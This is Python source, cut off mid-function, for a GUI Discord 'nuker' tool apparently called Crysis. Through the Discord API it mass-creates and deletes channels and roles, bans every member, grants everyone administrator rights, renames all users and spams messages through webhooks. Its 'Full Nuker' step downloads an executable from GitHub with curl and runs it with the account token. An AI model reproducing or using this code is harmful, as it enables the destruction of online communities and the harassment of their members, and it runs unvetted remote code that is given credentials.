from tkinter import messagebox, filedialog
from cryptography.fernet import Fernet
from winotify import Notification
from Crypto.Cipher import AES
from hashlib import *
from pystyle import *
from PIL import Image
import customtkinter
import pywinstyles
import webbrowser
import threading
from tqdm import tqdm
import PIL.Image
from datetime import datetime
import requests
import random
import win32con,win32gui
import base64
import json
import sys
import re
import os



class Settings(customtkinter.CTkToplevel):
    def __init__(setts):
        super().__init__()

        global saved
        saved = 0
        
        def close_settings():
            global saved
            if saved == 0:
                setts.destroy()
            elif saved > 0:
                if messagebox.askokcancel("Close settings", "Are you sure to close settings?\nYou have unsaved changes"):
                    setts.destroy()
        
        def load_settings():

            def getval(set, switch):
                value = data[set]
                if value == 0:
                    switch.deselect()
                elif value == 1:
                    switch.select()
                else:
                    messagebox.showerror('Error', 'settings.json corrupted')              
                    
            getval('set_transparency', transparency)
            getval('set_topmost', topmost)

        def changeval(setting, switch):

            if switch.get() == 1:
                data[setting] = 1
                with open(settings_json, "w") as f:
                    json.dump(data, f)

            elif switch.get() == 0:
                data[setting] = 0
                with open(settings_json, "w") as f:
                    json.dump(data, f)
            else:
                messagebox.showerror('Error', 'settings.json corrupted')

        def switch_transparency():
            changeval('set_transparency', transparency)
            global saved 
            saved += 1

        def switch_topmost():
            changeval('set_topmost', topmost)
            global saved 
            saved += 1
        
        setts.bind('<ButtonPress-1>', setts.drag)
        setts.bind('<B1-Motion>', setts.move)
        setts.bind('<ButtonRelease-1>', setts.stop)
        setts.overrideredirect(True)
        setts.protocol("WM_DELETE_WINDOW", close_settings)
        setts.wm_attributes("-topmost", 1)
        setts.geometry("400x250")

        main_frame = customtkinter.CTkLabel(setts, width=400, height=300, corner_radius=0, text=None)
        main_frame.pack()
        
        cross = customtkinter.CTkButton(main_frame, width=20, height=20, text='╳', bg_color='transparent', fg_color=transparent,
                                        hover_color=transparent, command=close_settings)
        cross.place(relx=0.9, rely=0.03)

        title = customtkinter.CTkLabel(main_frame, width=1, height=1, text='SETTINGS', font=title_font)
        title.place(relx = 0.05, rely = 0.035)

        line = customtkinter.CTkLabel(main_frame, height=1, width=1, text=None, image=setsline_img)
        line.place(relx=0.01, rely=0.14)

        transparency = customtkinter.CTkSwitch(main_frame, width=30, height=15, text='Dragging Transparency', bg_color='transparent', fg_color=button_color, 
                                            progress_color=pinky_color, offvalue=0, onvalue=1, command=switch_transparency)
        transparency.place(relx=0.07, rely=0.21)

        topmost = customtkinter.CTkSwitch(main_frame, width=30, height=15, text='Window Topmost', bg_color='transparent', fg_color=button_color, 
                                        progress_color=pinky_color, offvalue=0, onvalue=1, command=switch_topmost)
        topmost.place(relx=0.07, rely=0.33)  

        save = customtkinter.CTkButton(main_frame, width=60, height=25, corner_radius=3, text='Save', command=save_settings, bg_color='transparent', 
                                       fg_color=button_color, border_color=button_color, hover_color=pinky_color)
        save.place(relx=0.8, rely=0.75) 

        load_settings()

    def drag(win, event):
        win._x = event.x
        win._y = event.y

    def move(win, event):
        new_x = win.winfo_x() - win._x + event.x
        new_y = win.winfo_y() - win._y + event.y
        win.geometry(f'+{new_x}+{new_y}')

    def stop(win, event):
        win.geometry(f'+{win.winfo_x()}+{win.winfo_y()}')


class Nuker(customtkinter.CTk):

    
    def __init__(nuker):
        super().__init__()
        nuker.resizable(width=False, height=False)
        nuker.protocol("WM_DELETE_WINDOW", close)
        nuker.bind('<ButtonRelease-1>', nuker.stop)
        nuker.bind('<ButtonPress-1>', nuker.drag)
        nuker.bind('<B1-Motion>', nuker.move)
        nuker.iconbitmap(root_icon)
        nuker.geometry("920x460")

        nuker.title(f'Crysis')


        pywinstyles.apply_style(nuker, style='acrylic')
        pywinstyles.change_header_color(nuker, color=tot_black) 
        pywinstyles.change_border_color(nuker, color=tot_black)
        
        def process():
            global check_topmost
            if check_topmost > 0:
                check_topmost = 0
                nuker.get_topmost()
                nuker.after(1000, process)
            else:
                nuker.after(1000, process)

        login_notification()
        process()
        def move_leftbar():
            global position
            val = slider.get()
            if val == 0:
                position += 0.006
                left_bar.place(relx=position, rely=0)
                if position < 0.0:
                    nuker.after(10,move_leftbar)
            elif val == 1:
                position -= 0.006
                left_bar.place(relx=position, rely=0)
                if position > -0.2:
                    nuker.after(10,move_leftbar)

        main = customtkinter.CTkLabel(nuker, width=920, height=460, corner_radius=0, text=None, image=main_background)
        main.place(relx=0, rely=0)

        slider = customtkinter.CTkSwitch(main, bg_color=tot_black, height=10, width=10, fg_color=pinky_color, progress_color=button_color, 
                                        text=None, offvalue=0, onvalue=1, command=move_leftbar)
        slider.place(relx=0.865, rely=0.02)

        settings_button = customtkinter.CTkButton(main, height=1, width=1, fg_color=tot_black, hover_color=tot_black, bg_color=tot_black, 
                                                  corner_radius=0, text_color=tot_white, image=settings_ico, text=None, command=nuker.open_settstoplevel)
        settings_button.place(relx=0.91, rely=0.006)

        global position
        position = 0.0
        left_bar = customtkinter.CTkFrame(main, width=160, height=460, corner_radius=0, fg_color=leftbar_color)
        left_bar.place(relx=position, rely=0)

        logo = customtkinter.CTkButton(left_bar, image=main_logo, height=60, width=60, text=None, fg_color=leftbar_color, hover_color=leftbar_color, anchor='center')
        logo.place(relx= 0.07, rely = 0.02)

        global channels_feature
        channels_feature = customtkinter.CTkButton(left_bar, height=30, width=160, fg_color=leftbar_color, hover_color=button_color, corner_radius=0, text='Channels',
                                                    font=button_font, text_color=tot_white, anchor='w', image=channels_ico, compound='left', command=nuker.channels_function)
        channels_feature.place(relx=0, rely=0.38)
       
        global messages_feature
        messages_feature = customtkinter.CTkButton(left_bar, height=30, width=160,  fg_color=leftbar_color, hover_color=button_color, corner_radius=0, text='Messages', 
                                                   font=button_font, text_color=tot_white, anchor='w', image=messages_ico, compound='left', command=nuker.messages_function)
        messages_feature.place(relx=0, rely=0.45)
        
        global roles_feature
        roles_feature = customtkinter.CTkButton(left_bar, height=30, width=160, fg_color=leftbar_color,  hover_color=button_color, corner_radius=0, text='Roles', 
                                                font=button_font, text_color=tot_white, anchor='w', image=roles_ico, compound='left', command=nuker.roles_function )
        roles_feature.place(relx=0, rely=0.52)
        
        global fullnuker_feature
        fullnuker_feature = customtkinter.CTkButton(left_bar, height=30, width=160, fg_color=leftbar_color, hover_color=button_color, corner_radius=0, text='Full Nuker', 
                                                    text_color=tot_white, font=button_font, anchor='w', image=nuker_ico, compound='left', command=nuker.fullnuker_function)
        fullnuker_feature.place(relx=0, rely=0.59) 

        openconfig_feature = customtkinter.CTkButton(left_bar, height=30, width=160, fg_color=leftbar_color, hover_color=button_color, corner_radius=0, text='Config',
                                                    text_color=tot_white, font=button_font, anchor='w', image=folder_ico, compound='left', command=nuker.open_settings)
        openconfig_feature.place(relx=0, rely=0.66)
        
        global serverprof_feature
        serverprof_feature = customtkinter.CTkButton(left_bar, height=30, width=160, fg_color=leftbar_color, hover_color=button_color, corner_radius=0, text='Webhook', 
                                                    text_color=tot_white, font=button_font, anchor='w', image=server_ico, compound='left', command=nuker.persononalize_function)
        serverprof_feature.place(relx=0,rely=0.73)
        
        global backup_feature
        backup_feature = customtkinter.CTkButton(left_bar, height=30, width=160, fg_color=leftbar_color, hover_color=button_color, corner_radius=0, text='Backup',
                                                text_color=tot_white, font=button_font, anchor='w', image=backup_ico, compound='left', command=nuker.backup_function)
        backup_feature.place(relx=0,rely=0.933)

        barbuttons_list.append([channels_feature,  messages_feature, roles_feature, 
                                fullnuker_feature, serverprof_feature, backup_feature])
        
        nuker.toplevel_window = None
        nuker.channels_function()


    def open_settstoplevel(main):
                if main.toplevel_window is None or not main.toplevel_window.winfo_exists():
                    main.toplevel_window = Settings()
                else:
                    main.toplevel_window.focus()
    
    def open_settings(main):
        try:
            start_file(config_json)
        except Exception as e:
            messagebox.showerror('Error', e)

            clean_frames()
            channels_feature.configure(fg_color = button_color)

    def channels_function(main):
            def cchannels():
                #try:
                community = community_checker()
                
                channel_name = channelsname_input.get().replace(" ","")

                if len(channel_name) == 0:
                    show_error("TYPE A VALID NAME !")
                    return

                try:
                    howmany = int(howmany_input.get())

                except ValueError:
                    show_error("ENTER A VALID HOWMANY !")
                    return
                
                get_type = channel_type.get()

                c_type = 27

                if get_type == "# | Text":
                    c_type = 0
                elif get_type == "🔈 | Audio":
                    c_type = 2
                
                if community == True:
                    if get_type == "📑 | Forum":
                        c_type = 15
                    elif get_type == "📣 | Announcements":
                        c_type = 5
                    elif get_type == "🎤 | Stage":
                        c_type = 13

                elif (community == False or community == None) and c_type == 27:
                    messagebox.showerror('Error', ' You cannot chose this channel type because server community is not configurated.')
                
                if c_type != 27:
                    url = f"https://discord.com/api/{api}/guilds/{server_id}/channels"

                    data = {
                        "name": channel_name,
                        "type": c_type
                    }

                    def creator():
                        try:
                            requests.post(url, headers=basic_headers, json=data)
                        except:
                            pass


                    for _ in range(howmany):
                        t = threading.Thread(target=creator)
                        t.start()
                    
                    messagebox.showinfo("CREATE CHANNELS","DONE :)")

            def dchannels():
                req = requests.get(f"http://discord.com/api/guilds/{server_id}/channels", headers=basic_headers).json()

                def delete(channel_id):
                    try:
                        requests.delete(f"https://discord.com/api/{api}/channels/{channel_id}", headers=basic_headers)

                    except (requests.exceptions.ConnectTimeout, requests.exceptions.ProxyError):
                        print("timeout / proxy error")
                        pass
                

                for rep in req:
                    ids = rep["id"]
                    t = threading.Thread(target=delete, args=(ids,))
                    t.start()
                
                messagebox.showinfo("DELETE CHANNELS","DONE :)")


            main_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
            main_frame.place(relx = 0.215, rely = 0.12)


            channel_label = customtkinter.CTkLabel(main_frame,text='CREATE CHANNELS',font=title_font).place(relx=0.1,rely=0.052)

            prompt_line(main_frame, 0.1, 0.245)
 
            channelsname_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Name...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color)
            channelsname_input.place(relx=0.1,rely=0.19)

            howmany_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Howmany...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,
                                                   fg_color=button_color,border_width=2.5)
            howmany_input.place(relx=0.1,rely=0.32)

            prompt_line(main_frame, 0.1,0.38)

            channel_type = customtkinter.CTkOptionMenu(main_frame,height=23,width=187,text_color=tot_black,font=input_font,fg_color=frame_color,button_color=frame_color,button_hover_color=button_color,
                                                       dropdown_font=input_font,dropdown_fg_color=pinky_color,dropdown_hover_color=pinky2_color,values=["# | Text",
                                                                                                                                                        "🔈 | Audio",
                                                                                                                                                        "📑 | Forum",
                                                                                                                                                        "📣 | Announcements",
                                                                                                                                                        "🎤 | Stage"])
            channel_type.place(relx=0.12,rely=0.46)

            prompt_line(main_frame, 0.1,0.51)

            confirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,fg_color=pinky_color,
                                                     hover_color=pinky2_color,command=cchannels).place(relx=0.1,rely=0.57)

            second_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
            second_frame.place(relx = 0.62, rely = 0.12)
            
            delchannel_label = customtkinter.CTkLabel(second_frame,text='DELETE ALL',font=title_font,fg_color=button_color).place(relx=0.1,rely=0.052)

            confirm_button = customtkinter.CTkButton(second_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                     hover_color=pinky2_color,command=dchannels).place(relx=0.65,rely=0.17)
            frame_list.append([main_frame, second_frame])

    def messages_function(main):#TO COMPLETE

        clean_frames()
        messages_feature.configure(fg_color = button_color)
        
        def reqmsg():
            
            try:
                webhookurl = json.loads(open(webhook_file,"r").read())

                if len(webhookurl) == 2:
                    webhookurl = webhookurl["url"]

                    if requests.get(webhookurl).status_code != 200:
                        raise ValueError() #intentional error

                else:
                    raise ValueError() #intentional error

            except:
                show_error("ERROR WITH `webhook.json` (GENERATE A NEW ONE)")
                return 
            
            def send():
                try:                       
                    r = requests.post(webhookurl, json={"content" : message_input.get()},proxies=get_proxy(),timeout=5)
                    print(r.text , r.status_code)
                except:
                    pass
            

            howmany = 0

            try:
                howmany = int(howmany_input.get())
            
            except ValueError:
                show_error("Enter a VALID HOWMANY !")
                return 

            for _ in range(howmany*2):
                t = threading.Thread(target=send)
                t.start()

        main_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
        main_frame.place(relx = 0.215, rely = 0.12)

        channel_label = customtkinter.CTkLabel(main_frame,text='MESSAGES SPAMMER',font=title_font).place(relx=0.1,rely=0.052)

        message_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Message...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color)
        message_input.place(relx=0.1,rely=0.15)

        prompt_line(main_frame, 0.1, 0.205)

        howmany_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Howmany...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,
                                               fg_color=button_color,border_width=2.5)
        howmany_input.place(relx=0.1,rely=0.28)

        prompt_line(main_frame, 0.1,0.34)

        confirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                     hover_color=pinky2_color,command=reqmsg).place(relx=0.65,rely=0.42)


    def roles_function(main):
            clean_frames()
            roles_feature.configure(fg_color = button_color)

            def role_creator():

                role_name = rolename_input.get()

                try:
                    howmany = int(howmany_input.get())
                except ValueError:
                    show_error("[!] Enter a valid howmany.")
                    return
                
                json = {
                    "color" : 0,
                    "name" : role_name,
                    "permissions" : "8"
                }

                def create():
                    requests.post(f"https://discord.com/api/{api}/guilds/{server_id}/roles",headers=basic_headers,json=json)

                for _ in range(howmany):
                    t = threading.Thread(target=create)
                    t.start()
                
                messagebox.showinfo("ROLES CREATOR","DONE :)")

            def role_deleter():
                try:
                    r_id = int(roleid_input.get())
                except ValueError:
                    show_error("ROLE ID NOT VALID")
                    return
                

                if id_check(str(r_id)):
                    r = requests.delete(f"https://discord.com/api/{api}/guilds/{server_id}/roles/{r_id}",headers=basic_headers)

                    if int(str(r.status_code)[0]) == 2:
                        messagebox.showinfo("ROLE DELETER","DONE :)")

                    else:
                        show_error(f"{r.status_code}\n\n{r.json()['message']}")

                else:
                    show_error("ROLE ID NOT VALID")
            

            def allroles_deleter():
                req = requests.get(f"https://discord.com/api/{api}/guilds/{server_id}/roles", headers=basic_headers).json()

                def delete_role(r_id):
                    try:
                        requests.delete(f"https://discord.com/api/{api}/guilds/{server_id}/roles/{r_id}", headers=basic_headers)
                    except Exception as e:
                        print(e)
                        pass
                for rep in req:
                    r_id = rep["id"]
                    t = threading.Thread(target=delete_role,args=(r_id,))
                    t.start()

            def ban_all():

                def ban(user):
                    requests.put(f"https://discord.com/api/{api}/guilds/{server_id}/bans/{user['id']}",headers=basic_headers,json={"delete_message_seconds" : 3600})


                r = requests.get(f"https://discord.com/api/{api}/guilds/{server_id}/members?limit=1000",headers=basic_headers).json()

                for user in r:
                    user = user["user"]
                    t = threading.Thread(target=ban,args=(user,))
                    t.start()

                messagebox.showinfo("BAN ALL","DONE :)")

            def admin_create():
                role_name = "$$$_ADMIN_$$$"

                json = {
                    "color" : 0,
                    "name" : role_name,
                    "permissions" : "8"
                }

                req = requests.post(f"https://discord.com/api/{api}/guilds/{server_id}/roles",headers=basic_headers,json=json)

                if req.status_code == 200:
                    role_id = req.json()["id"]


                return role_id
            
            def admin():
                role_id = admin_create()

                json = {
                    "roles" : [role_id]
                }
                    
                r = requests.patch(f"https://discord.com/api/{api}/guilds/{server_id}/members/{auserid_input.get()}",headers=basic_headers,json=json)

                if r.status_code == 200:
                    messagebox.showinfo("ADMIN GIVER", "DONE :)")

                else:
                    show_error(f"{r.status_code} => {r.json()['message']}")

            def giveall_admin():
                def admin_ft(role_id):

                    json = {
                            "roles" : [role_id]
                        }
                    
                    requests.patch(f"https://discord.com/api/{api}/guilds/{server_id}/members/{u['user']['id']}",headers=basic_headers,json=json)

                role_id = admin_create()

                user_id = requests.get(f"https://discord.com/api/{api}/guilds/{server_id}/members?limit=1000",headers=basic_headers).json()

                for u in user_id:
                    threading.Thread(target=admin_ft,args=(role_id,)).start()

                messagebox.showinfo("ALL ADMIN", "DONE :)")
                        
             
            def changeall_nicks():

                def change_nick_ft(user_id,nickname):
                    data = {"nick" : nickname}

                    requests.patch(f"https://discord.com/api/{api}/guilds/{server_id}/members/{user_id['id']}",headers=basic_headers,json=data)
                
                
                nickname = nick_input.get().replace(" ","")

                if nickname == "":
                    show_error("NICKNAME CAN'T BE EMPTY !")
                    return

                r = requests.get(f"https://discord.com/api/{api}/guilds/{server_id}/members?limit=1000",headers=basic_headers).json()
                
                for user in r:
                    
                    user_id = user["user"]

                    threading.Thread(target=change_nick_ft,args=(user_id,nickname,)).start()

                messagebox.showinfo("NICKS CHANGED","DONE :)")
          

            main_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
            main_frame.place(relx = 0.215, rely = 0.12)


            channel_label = customtkinter.CTkLabel(main_frame,text='ROLES CREATOR',font=title_font).place(relx=0.1,rely=0.052)

            rolename_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Role Name...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color)
            rolename_input.place(relx=0.1,rely=0.15)
            prompt_line(main_frame, 0.1, 0.205)

            howmany_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Howmany...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,
                                                   fg_color=button_color,border_width=2.5)
            howmany_input.place(relx=0.1,rely=0.28)
            prompt_line(main_frame, 0.1,0.34)

            cconfirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Create',text_color=tot_black,border_color=tot_black,border_width=1.5,fg_color=pinky_color,hover_color=pinky2_color,
                                                      command=role_creator).place(relx=0.65,rely=0.42)

            drole_label = customtkinter.CTkLabel(main_frame,text='ROLE DELETER',font=title_font).place(relx=0.1,rely=0.5)

            roleid_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Role Id...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color,)
    
            roleid_input.place(relx=0.1,rely=0.6)

            prompt_line(main_frame, 0.1, 0.66)

            cconfirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Delete',text_color=tot_black,border_color=tot_black,border_width=1.5,fg_color=pinky_color,hover_color=pinky2_color,command=role_deleter).place(relx=0.65,rely=0.72)

            delall = customtkinter.CTkLabel(main_frame,text='DELETE ALL ROLES',font=title_font).place(relx=0.1,rely=0.8)

            dconf = customtkinter.CTkButton(main_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,fg_color=pinky_color,hover_color=pinky2_color,
                                            command=allroles_deleter).place(relx=0.65,rely=0.9)


            second_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
            second_frame.place(relx = 0.62, rely = 0.12)

            banall = customtkinter.CTkLabel(second_frame,text='BAN ALL',font=title_font).place(relx=0.1,rely=0.052)
            
            cbanall_button = customtkinter.CTkButton(second_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                     hover_color=pinky2_color,command=ban_all).place(relx=0.65,rely=0.17)
            

            drole_label = customtkinter.CTkLabel(second_frame,text='ADMIN GIVER',font=title_font).place(relx=0.1,rely=0.3)

            auserid_input = customtkinter.CTkEntry(second_frame,height=20,width=150,placeholder_text='User Id...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color)
            auserid_input.place(relx=0.1,rely=0.4)
            prompt_line(second_frame, 0.1, 0.46)

            cgiveadmin_button = customtkinter.CTkButton(second_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                        hover_color=pinky2_color,command=admin).place(relx=0.65,rely=0.53)
            
            cgivealladmin_button = customtkinter.CTkButton(second_frame,height=20,width=70,text='Everyone admin',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,
                                                           fg_color=pinky_color,hover_color=pinky2_color,command=giveall_admin).place(relx=0.1,rely=0.53)

            nick_label = customtkinter.CTkLabel(second_frame,text='NICKNAMES CHANGER',font=title_font).place(relx=0.1,rely=0.66)

            nick_input = customtkinter.CTkEntry(second_frame,height=20,width=150,placeholder_text='Nickname...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color,)
            nick_input.place(relx=0.1,rely=0.76)
            prompt_line(second_frame, 0.1, 0.82)

            changenick_button = customtkinter.CTkButton(second_frame,height=20,width=70,text='Confirm', text_color=tot_black,border_color=tot_black, border_width=1.5,bg_color=button_color,
                                                        fg_color=pinky_color,hover_color=pinky2_color,command=changeall_nicks ).place(relx=0.65,rely=0.89)

    def fullnuker_function(main):

        clean_frames()
        fullnuker_feature.configure(fg_color = button_color)

        def nuke():
            default_message = str(msg_input.get())

            default_message = f"{default_message} ||@everyone||" if checkbox.get() == 1 else default_message


            if len(default_message.replace(" ","")) == 0:
                show_error("Type a VALID MESSAGE !")
                return

            try:
                open(fullnuker_path,"rb")
            
            except FileNotFoundError:
                try:
                    os.system(f'curl https://raw.githubusercontent.com/astros3x/Crysis/main/source/bin/tools/fullnuker.exe --output {fullnuker_path} > nul 2>&1')

                except:
                    messagebox.show_error("FULLNUKER ERROR","FULLNUKER NOT FOUND (DOWNLOAD IT MANUALLY)")

            r = Fernet.generate_key()

            k = Fernet(r)
            b = k.encrypt(default_message.encode())

            os.system(f"start {fullnuker_path} {token} {server_id} {api} {b.decode()} {r.decode()}")

        main_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
        main_frame.place(relx = 0.215, rely = 0.12)

        mainframe_label = customtkinter.CTkLabel(main_frame,text='FULL NUKER',font=title_font).place(relx=0.1,rely=0.052)
        
        msg_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Nuking message',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color,)
        msg_input.place(relx=0.1,rely=0.19)

        prompt_line(main_frame, 0.1, 0.245)

        checkbox =  customtkinter.CTkCheckBox(main_frame, fg_color=pinky_color, bg_color=button_color, width=12, height=12, checkbox_width=16, checkbox_height=16, 
                                              border_width=2, corner_radius=2, border_color=pinky_color, hover_color=pinky2_color, checkmark_color='white', 
                                              text=' add @everyone', text_color=tot_black,font = (None, 11), onvalue=1, offvalue=0)
        checkbox.place(relx = 0.15, rely= 0.3)

        confirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                 hover_color=pinky2_color,command=nuke).place(relx=0.65,rely=0.35)


        
    def persononalize_function(main):
        def webhook_check():
            try:
                f = json.loads(open(webhook_file,"r").read())

                f["channelid"]
                f["url"]

                if len(f) !=2:
                    return False
                
                return True

            except:
                try:
                    os.remove(webhook_file)
                    return False

                except FileNotFoundError:
                    return False
                            

        clean_frames()
        serverprof_feature.configure(fg_color = button_color)

        def upload_serverimg():
            global simg
            simg = filedialog.askopenfilename(title='Crysis | Upload image', filetypes=[("File PNG", ".png")])

        def upload_webhookimg():
            global wimg
            wimg = filedialog.askopenfilename(title='Crysis | Upload image', filetypes=[("File PNG", ".png")])
            
        def change_serverprofile():
            global simg
            
            servername = servername_input.get()

            def icon():
                base64_img = f'data:image/png;base64,{base64.b64encode(open(simg, "rb").read()).decode("utf-8")}'
                json = {"icon" : base64_img}

                requests.patch(f"https://discord.com/api/{api}/guilds/{server_id}",headers=basic_headers,json=json)
                
            def name():
                server_name = servername
                json = {"name" : server_name}

                requests.patch(f"https://discord.com/api/{api}/guilds/{server_id}",headers=basic_headers,json=json)

            try:
                icon()

            except:
                show_error("IMAGE NOT SELECTED")
                return

            name()

            messagebox.showinfo("DONE", "😏 CHECK YOUR SERVER 😏")
                
        def webhook_custom():
            
            channelid = ""

            if webhook_presence:

                file = open(webhook_file,"r").read()
                ctx = json.loads(file)

                try:
                    channelid = ctx["channelid"]

                except KeyError:
                    show_error("`webhook.json` is CORRUPTED")
                    return
            else:

                channelid = webhook_channel_id.get()

                if id_check(channelid) == False:
                    show_error("CHANNEL ID NOT VALID")
                    return

            global wimg

            data = {
                "name": webhookname_input.get()
            }

            try:

                base64_img = f'data:image/png;base64,{base64.b64encode(open(wimg, "rb").read()).decode("utf-8")}'

            except:
                show_error("IMAGE NOT SELECTED")
                return
            
            data["avatar"] = base64_img

            
            url = f"https://discord.com/api/{api}/channels/{channelid}/webhooks"

            response = requests.post(url, headers=basic_headers, data=json.dumps(data),timeout=5)

            if response.status_code == 200:

                structure = {"channelid" : channelid, "url" : response.json()["url"]}

                open(webhook_file,"w").write(json.dumps(structure))

                messagebox.showinfo("DONE", "Your WEBHOOK has been SUCCESSFULLY created !")

            else:
                show_error(f"{response.status_code}\n\n{response.json()['message']}\n\nCHECK YOUR `webhook.json` OR `WEBHOOK NAME`")


        webhook_presence = webhook_check()
        
        main_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
        main_frame.place(relx = 0.215, rely = 0.12)

        mainframe_label = customtkinter.CTkLabel(main_frame,text='SERVER PROFILE',font=title_font).place(relx=0.1,rely=0.052)
        
        servername_input = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Server name',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color,)
        servername_input.place(relx=0.1,rely=0.19)

        prompt_line(main_frame, 0.1, 0.245)


        uploader_button = customtkinter.CTkButton(main_frame,width=70,height=20,text='Upload image',text_color=tot_black,border_color=tot_black,border_width=1.5,fg_color=pinky_color,
                                                  hover_color=pinky2_color,command=upload_serverimg)
        uploader_button.place(relx=0.1, rely=0.35)

        confirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                 hover_color=pinky2_color,command=change_serverprofile).place(relx=0.65,rely=0.5)
        
        second_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
        second_frame.place(relx = 0.62, rely = 0.12)

        webhook_label = customtkinter.CTkLabel(second_frame,text='WEBHOOK CUSTOMIZER',font=title_font,fg_color=button_color).place(relx=0.1,rely=0.052)
        

        webhook_channel_id = customtkinter.CTkEntry(second_frame,height=20,width=150,placeholder_text='Webhook Channel Id',font=input_font,placeholder_text_color=tot_black,
                                                    border_color=button_color,fg_color=button_color,)
        
        webhookname_input = customtkinter.CTkEntry(second_frame,height=20,width=150,placeholder_text='Webhook Name',font=input_font,placeholder_text_color=tot_black,
                                                   border_color=button_color,fg_color=button_color)

        webhookname_input.place(relx=0.1,rely=0.19)

        prompt_line(second_frame, 0.1, 0.245)
        
        
        if webhook_presence == False:
            webhook_channel_id.place(relx=0.1,rely=0.30)
            prompt_line(second_frame, 0.1, 0.35)

        webuploader_button = customtkinter.CTkButton(second_frame,width=70,height=20,text='Upload image',text_color=tot_black,border_color=tot_black,
                                                     border_width=1.5,fg_color=pinky_color,hover_color=pinky2_color,command=upload_webhookimg)
        webuploader_button.place(relx=0.1, rely=0.50)

        confirm_button = customtkinter.CTkButton(second_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,
                                                 bg_color=button_color,fg_color=pinky_color,hover_color=pinky2_color,command=webhook_custom).place(relx=0.65,rely=0.5)

    def backup_function(main):
        clean_frames()
        backup_feature.configure(fg_color = button_color)

        def backup():

            def download(typez,ext):
                if r[typez] != None:
                    open(f"{BASE_PATH}\\server_{typez}.{ext}","wb").write(requests.get(f"https://cdn.discordapp.com/{typez}s/{server_id}/{r[typez]}.{ext}?size=1024").content)


            def make_request(endpoint):
                r = requests.get(f"{BASE_REQUEST}/{endpoint}",headers=basic_headers)

                return r


            name = str(backupname.get()).replace(" ","")

            channel_box = 1 if cha_checkbox.get() == 1 else 0

            roles_box = 1 if rol_checkbox.get() == 1 else 0

            webhook_box = 1 if web_checkbox.get() == 1 else 0


            if len(name) == 0:
                show_error("Type a VALID NAME !")
                return 
            

            else:

                BASE_PATH = f"{backup_folder}{name}_backup"

                BASE_REQUEST = f"https://discord.com/api/{api}/guilds/{server_id}"

                dicts = {"id" : "SERVER ID", "name" : "NAME", "icon" : "ICON", "description" : "Description", "banner" : "BANNER", "owner_id" : "Owner ID","region" : "Region", "verification_level" : "Verification Level", "vanity_url_code" : "Customize URL CODE", "premium_tier" : "BOOST Level", "preferred_locale" : "Preferred Language"}


                r = requests.get(BASE_REQUEST,headers=basic_headers).json()


                date = datetime.now()
                message = f"--- SERVER BACKUP for `{r['name']}` ---\n\nBackup Date => {date.day}/{date.month}/{date.year} | {date.hour}:{date.minute}:{date.second}\n"


                try:
                    os.system(f"mkdir {BASE_PATH} > nul 2>&1")
                
                    for k in dicts.keys():
                        message+= f"{dicts[k]} => {r[k]}\n"
                    
                                    
                    download("banner","gif")
                    download("icon","png")

                except OSError:
                    show_error("Type a VALID NAME !")
                    return 
                

                if channel_box == 1:

                    #CHANNELS
                    message += f"\n\n-----------------------------------------------------\n\n\nCHANNELS\n"

